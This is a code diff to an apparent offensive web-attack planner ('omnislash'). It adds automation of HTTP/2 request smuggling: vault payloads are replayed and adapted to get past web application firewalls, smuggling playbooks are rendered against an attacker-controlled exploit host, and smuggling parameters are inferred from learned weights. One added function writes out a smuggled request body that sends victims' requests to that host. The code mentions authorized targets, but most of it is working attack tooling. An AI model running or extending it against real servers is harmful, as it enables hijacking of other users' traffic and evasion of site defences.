@@ -36,6 +36,17 @@ try:
 except Exception:  # pragma: no cover - optional adaptive dependency path
     AdaptiveProbePlanner = None
     def adaptive_observations_from_records(records): return {}
+try:
+    from research.self_learning import (
+        DEFAULT_WEIGHTS_PATH,
+        ParameterInferencer,
+        load_weights,
+    )
+except Exception:  # pragma: no cover - optional learning dependency path
+    DEFAULT_WEIGHTS_PATH = os.path.join("state", "learned_weights.json")
+    ParameterInferencer = None
+    def load_weights(path):
+        return {"schema": "omnislash.learned-weights/v1", "global": {}, "hosts": {}, "tech": {}}
 
 
 CACHE_HEADER_HINTS = {"x-cache", "cf-cache-status", "age", "via", "vary", "cache-control"}
@@ -145,6 +156,37 @@ def _target_addr(target: Dict[str, Any]) -> str:
     return f"{host}:{port}"
 
 
+def _render_template(value: Any, bindings: Dict[str, str]) -> Any:
+    """Fill playbook placeholders without touching any other field."""
+    if isinstance(value, str):
+        out = value
+        for key, replacement in bindings.items():
+            out = out.replace("{{%s}}" % key, str(replacement))
+        return out
+    if isinstance(value, list):
+        return [_render_template(item, bindings) for item in value]
+    if isinstance(value, dict):
+        return {k: _render_template(v, bindings) for k, v in value.items()}
+    return value
+
+
+def _playbook_bindings(target: Dict[str, Any]) -> Dict[str, str]:
+    host = str(target.get("target") or target.get("host") or "").strip()
+    exploit = (
+        target.get("exploit_host")
+        or target.get("exploit_server")
+        or target.get("collaborator_host")
+        or ""
+    )
+    return {
+        "TARGET_ADDR": _target_addr(target),
+        "TARGET_HOST": host,
+        "EXPLOIT_HOST": str(exploit).strip(),
+        "TARGET_PATH": str(target.get("path") or "/").strip() or "/",
+        "OUTER_PATH": str(target.get("outer_path") or "/").strip() or "/",
+    }
+
+
 def _base_job(name: str, target: Dict[str, Any], probe: str, tls: str) -> Dict[str, Any]:
     host = str(target.get("target") or target.get("host") or "").strip()
     addr = _target_addr(target)
@@ -178,34 +220,54 @@ def plan_target(target: Dict[str, Any], critical_endpoints: List[str] = None, va
         return []
     jobs: List[Dict[str, Any]] = []
     tech = _norm_tech(target)
-    tech_l = " ".join(tech).lower()
 
-    # Echelon 2: Universal Key from zero-day vault - skip long evolution.
+    # Echelon 2: curated Universal Keys / playbooks from the vault.
     if vault:
-        keys = find_keys_for_stack(vault, tech)
-        if keys:
-            k = keys[0]
-            j = _base_job(f"{host}-universal-key", target, "raw-replay", "h1")
-            raw_b64 = k.get("raw_payload_b64", "")
-            if waf_store and raw_b64:
-                prof = get_profile(waf_store, host)
-                if prof is not None:
-                    try:
-                        raw = base64.b64decode(raw_b64.encode("ascii"))
-                        raw = adapt_payload_for_waf(raw, prof)
-                        raw_b64 = base64.b64encode(raw).decode("ascii")
-                        j.setdefault("metadata", {})["waf_adapted"] = True
-                    except Exception:
-                        pass
-            j["raw_payload_b64"] = raw_b64
-            j["success_contains"] = str((k.get("metadata") or {}).get("success_contains", ""))
-            j["attempts"] = 1
-            j["until_success"] = True
+        for k in find_keys_for_stack(vault, tech):
+            technique = str(k.get("technique") or "raw-replay").lower()
+            meta = k.get("metadata") or {}
+            if technique == "h2-cl":
+                # A curveball playbook needs an exploit host to render its
+                # smuggled absolute-form request. Without one it is skipped;
+                # the normal planner still runs.
+                if not has_h2_support(target):
+                    continue
+                bindings = _playbook_bindings(target)
+                if not bindings["EXPLOIT_HOST"]:
+                    continue
+                overrides = _render_template(k.get("job_overrides") or {}, bindings)
+                if not isinstance(overrides, dict):
+                    continue
+                overrides.pop("target", None)
+                overrides.pop("name", None)
+                j = _base_job(f"{host}-h2-cl-playbook", target, "h2-cl", str(k.get("tls") or "h2"))
+                j.update(overrides)
+            else:
+                j = _base_job(f"{host}-universal-key", target, "raw-replay", "h1")
+                raw_b64 = k.get("raw_payload_b64", "")
+                if waf_store and raw_b64:
+                    prof = get_profile(waf_store, host)
+                    if prof is not None:
+                        try:
+                            raw = base64.b64decode(raw_b64.encode("ascii"))
+                            raw = adapt_payload_for_waf(raw, prof)
+                            raw_b64 = base64.b64encode(raw).decode("ascii")
+                            j.setdefault("metadata", {})["waf_adapted"] = True
+                        except Exception:
+                            pass
+                j["raw_payload_b64"] = raw_b64
+                j["success_contains"] = str(meta.get("success_contains", ""))
+                j["attempts"] = 1
+                j["until_success"] = True
             j["metadata"]["universal_key"] = {
                 "id": k.get("id"),
                 "tech_stack_hash": k.get("tech_stack_hash"),
                 "mutation_type": k.get("mutation_type"),
                 "protocol_edge": k.get("protocol_edge"),
+                "technique": technique,
+                "provenance": k.get("provenance", ""),
+                "case_id": meta.get("case_id", ""),
+                "template": meta.get("template", ""),
                 "gittins_index": 9999.0,
             }
             j["metadata"]["gittins_index"] = 9999.0
@@ -319,6 +381,122 @@ def plan_target_adaptive(
     return jobs, summary
 
 
+def _inferred_exploit_host(target: Dict[str, Any]) -> str:
+    return str(
+        target.get("exploit_host")
+        or target.get("exploit_server")
+        or target.get("collaborator_host")
+        or ""
+    ).strip()
+
+
+def plan_target_inferred(
+    target: Dict[str, Any],
+    weights_path: str,
+    telemetry_entry: Any = None,
+    max_hypotheses: int = 2,
+) -> Any:
+    """Ask ParameterInferencer for h2-cl candidates from native learned weights.
+
+    This path never reads the curated playbook. Jobs are marked
+    ``autonomous-inferred`` and only emitted for an authorized target that
+    supplies its own exploit host.
+    """
+    if not weights_path or not os.path.isfile(weights_path) or ParameterInferencer is None:
+        return [], {}
+    if is_excluded(target):
+        return [], {}
+    host = str(target.get("target") or target.get("host") or "").strip()
+    if not host:
+        return [], {}
+    exploit_host = _inferred_exploit_host(target)
+    observations: List[Dict[str, Any]] = [
+        obs for obs in (target.get("observations") or []) if isinstance(obs, dict)
+    ]
+    if isinstance(telemetry_entry, dict):
+        observation = telemetry_entry.get("observation")
+        if isinstance(observation, dict):
+            observations.append(observation)
+    inferencer = ParameterInferencer(
+        load_weights(weights_path),
+        target_host=host,
+        tech_stack=_norm_tech(target),
+        external_hosts=[exploit_host] if exploit_host else None,
+    )
+    hypotheses = inferencer.infer(
+        observations,
+        candidate_paths=target.get("candidate_paths") or None,
+        max_hypotheses=max(1, int(max_hypotheses)),
+    )
+    hypotheses = [
+        h for h in hypotheses
+        if (h.get("scores") or {}).get("path", 0) > 0.5
+        and (h.get("scores") or {}).get("cl", 0) > 0.5
+    ]
+    jobs: List[Dict[str, Any]] = []
+    for index, hypothesis in enumerate(hypotheses):
+        if not exploit_host:
+            break
+        cl = int(hypothesis["smuggled_cl"])
+        smuggled_path = str(hypothesis["smuggled_path"])
+        # The filler body length matches the inferred framing boundary; it is
+        # synthesized here and is not copied from any curated payload.
+        filler = "A" * cl
+        body = (
+            "GET %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n\r\n%s"
+            % (smuggled_path, exploit_host, cl, filler)
+        )
+        job = _base_job(f"{host}-h2-cl-autonomous-{index + 1}", target, "h2-cl", "h2")
+        job.update({
+            "declared_length": 0,
+            "method": "POST",
+            "path": str(target.get("path") or "/"),
+            "body": body,
+            "victim_method": "GET",
+            "victim_path": str(target.get("victim_path") or "/"),
+            "hold_after_poison": hypothesis["hold_after_poison"],
+            "victim_delay": hypothesis["victim_delay"],
+            "same_connection_victim": hypothesis["connection_mode"] == "same",
+            "success_contains": str(target.get("success_contains") or target.get("success_marker") or ""),
+            "attempts": 1,
+            "until_success": True,
+            "timeout": "8s",
+            "idle": "2s",
+            "retry_delay": "0s",
+        })
+        job["metadata"]["provenance"] = "autonomous-inferred"
+        job["metadata"]["autonomous_inference"] = {
+            "provenance": "autonomous-inferred",
+            "weights": weights_path,
+            "smuggled_path": smuggled_path,
+            "smuggled_cl": cl,
+            "hold_after_poison": hypothesis["hold_after_poison"],
+            "victim_delay": hypothesis["victim_delay"],
+            "connection_mode": hypothesis["connection_mode"],
+            "scores": hypothesis["scores"],
+            "evidence": hypothesis["evidence"],
+        }
+        jobs.append(job)
+    summary = {
+        "schema": "omnislash.autonomous-inference/v1",
+        "host": host,
+        "weights": weights_path,
+        "hypotheses": len(hypotheses),
+        "jobs": len(jobs),
+        "parameters": [
+            {
+                "smuggled_path": h["smuggled_path"],
+                "smuggled_cl": h["smuggled_cl"],
+                "hold_after_poison": h["hold_after_poison"],
+                "victim_delay": h["victim_delay"],
+                "connection_mode": h["connection_mode"],
+            }
+            for h in hypotheses
+        ],
+    }
+    return jobs, summary
+
+
 def build_daemon_config(
     targets: List[Dict[str, Any]],
     omnislash_config: str = "config.json",
@@ -330,9 +508,12 @@ def build_daemon_config(
     adaptive_max_probes: int = 7,
     adaptive_min_posterior: float = 0.55,
     sniper_pool: Any = None,
+    learned_weights: str = "",
+    learned_max_hypotheses: int = 2,
 ) -> Dict[str, Any]:
     jobs: List[Dict[str, Any]] = []
     adaptive_plans: List[Dict[str, Any]] = []
+    inferred_plans: List[Dict[str, Any]] = []
     allow_hosts: List[str] = []
     seen_hosts = set()
     for t in targets:
@@ -341,16 +522,27 @@ def build_daemon_config(
         host = str(t.get("target") or t.get("host") or "").strip()
         if not host:
             continue
+        t_jobs: List[Dict[str, Any]] = []
         if adaptive:
-            t_jobs, plan_summary = plan_target_adaptive(
+            diagnostic_jobs, plan_summary = plan_target_adaptive(
                 t,
                 _telemetry_lookup(t, adaptive_telemetry or {}),
                 max_probes=adaptive_max_probes,
                 min_posterior=adaptive_min_posterior,
                 sniper_pool=sniper_pool,
             )
+            t_jobs.extend(diagnostic_jobs)
             if plan_summary:
                 adaptive_plans.append(plan_summary)
+            inferred_jobs, inferred_summary = plan_target_inferred(
+                t,
+                learned_weights,
+                _telemetry_lookup(t, adaptive_telemetry or {}),
+                max_hypotheses=learned_max_hypotheses,
+            )
+            t_jobs.extend(inferred_jobs)
+            if inferred_summary:
+                inferred_plans.append(inferred_summary)
         else:
             t_jobs = plan_target(t, t.get("critical_endpoints") or [], vault=vault, waf_store=waf_store)
         if t_jobs:
@@ -388,6 +580,11 @@ def build_daemon_config(
             "max_probes": adaptive_max_probes,
             "min_posterior": adaptive_min_posterior,
             "plans": adaptive_plans,
+            "autonomous_inference": {
+                "schema": "omnislash.autonomous-inference/v1",
+                "weights": learned_weights,
+                "targets": inferred_plans,
+            },
         }
     return cfg
 
@@ -426,6 +623,12 @@ def main(argv=None):
     ap.add_argument("--adaptive-max-probes", type=int, default=7, help="Hard request budget per target (default 7)")
     ap.add_argument("--adaptive-min-posterior", type=float, default=0.55, help="Strike only above this posterior")
     ap.add_argument("--adaptive-plan-out", default="", help="Optional JSON file for the adaptive decision trace")
+    ap.add_argument(
+        "--learned-weights",
+        default=DEFAULT_WEIGHTS_PATH,
+        help="Native calibrated weights used by ParameterInferencer in adaptive mode",
+    )
+    ap.add_argument("--learned-max-hypotheses", type=int, default=2, help="Autonomous parameter hypotheses per adaptive target")
     ap.add_argument("--sniper-pool", type=int, default=-1, help="Sniper reserve size for arbitrage priority (optional)")
     args = ap.parse_args(argv)
     if (args.adaptive_telemetry or args.adaptive_plan_out) and not args.adaptive:
@@ -462,6 +665,8 @@ def main(argv=None):
         adaptive_max_probes=args.adaptive_max_probes,
         adaptive_min_posterior=args.adaptive_min_posterior,
         sniper_pool=None if args.sniper_pool < 0 else args.sniper_pool,
+        learned_weights=args.learned_weights,
+        learned_max_hypotheses=args.learned_max_hypotheses,
     )
     with open(args.out, "w", encoding="utf-8") as f:
         json.dump(cfg, f, indent=2, ensure_ascii=False)
@@ -479,6 +684,9 @@ def main(argv=None):
         "adaptive_mode": adaptive_info.get("mode", ""),
         "adaptive_telemetry_hosts": len(telemetry),
         "adaptive_jobs": len(cfg["jobs"]) if args.adaptive else 0,
+        "autonomous_jobs": sum(
+            int((p.get("jobs") or 0)) for p in adaptive_info.get("autonomous_inference", {}).get("targets", [])
+        ),
     }, ensure_ascii=False))
 
 
